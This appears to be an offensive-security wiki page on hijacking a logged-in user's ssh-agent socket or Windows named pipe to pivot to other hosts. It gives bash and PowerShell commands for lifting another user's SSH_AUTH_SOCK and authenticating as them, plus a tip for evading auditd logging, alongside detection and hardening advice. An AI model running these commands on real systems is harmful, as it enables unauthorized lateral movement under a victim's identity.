---
title: SSH Agent Hijack
slug: ssh-agent-hijack
---

> **TL;DR:** Reuse a logged-in user's `ssh-agent` socket (or Windows named pipe) to authenticate as them to any downstream host — keys never leave the agent, you just borrow its signing oracle to pivot.

## What it is
`ssh-agent` keeps decrypted private keys in memory and exposes a signing API over a UNIX domain socket (Linux/macOS) or a named pipe `\\.\pipe\openssh-ssh-agent` (Windows OpenSSH). The agent's location is advertised via the `SSH_AUTH_SOCK` environment variable on Linux, or a fixed pipe name on Windows. Any process with read/write access to that endpoint can ask the agent to sign auth challenges — effectively pass-the-key without ever extracting the key material. Mapped to ATT&CK T1563.001 and T1552.004.

## Preconditions / where it applies
- Read/write on the agent endpoint: same UID as the victim, or root/SYSTEM on the host
- Victim has loaded keys via `ssh-add` (Linux) or `Start-Service ssh-agent` + `ssh-add` (Windows); forwarded agents over `ssh -A` are the highest-value target on jumpboxes
- Agent forwarding amplifies impact: keys loaded on a laptop are reachable from every host the user SSHs into

## Technique
On Linux, find the victim's process environment, lift `SSH_AUTH_SOCK`, and run `ssh` with that variable. On Windows, the pipe name is fixed — just connect from any process running as the victim (or SYSTEM).

```bash
# Linux — locate the agent socket of another user (root required for /proc/PID/environ)
for pid in $(pgrep -u victim); do
  tr '\0' '\n' </proc/$pid/environ | grep -E '^SSH_AUTH_SOCK='
done
SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.1337 ssh -o StrictHostKeyChecking=no victim@target
ssh-add -l   # list keys the agent will sign with
```

```powershell
# Windows OpenSSH — the pipe is the same name for every session of the user
Get-Service ssh-agent
$env:SSH_AUTH_SOCK = '\\.\pipe\openssh-ssh-agent'
ssh -l victim target.corp
```

OPSEC: using the agent leaves a normal `sshd` auth log entry for the victim user — blends with their baseline. Avoid `ssh-add -L` on hosts running auditd with `execve` logging; query the socket directly via libssh-agent bindings if you need to stay quieter.

## Detection and defence
- Auditd / Sysmon-for-Linux: process accessing `/tmp/ssh-*/agent.*` whose UID differs from the socket owner, or connections to the openssh pipe from non-`ssh.exe` images
- Disable `ForwardAgent` by default in `~/.ssh/config`; prefer `ssh -J` (ProxyJump) so keys never leave the workstation
- On jumpboxes, set `AllowAgentForwarding no` in `sshd_config`; on Windows, restrict who can connect to `\\.\pipe\openssh-ssh-agent` via service ACLs

## References
- [Embrace The Red — TTP Diaries: SSH Agent Hijacking](https://embracethered.com/blog/posts/2022/ttp-diaries-ssh-agent-hijacking/) — original walkthrough with Linux PoC
- [MITRE ATT&CK T1563.001](https://attack.mitre.org/techniques/T1563/001/) — SSH Hijacking sub-technique and detections
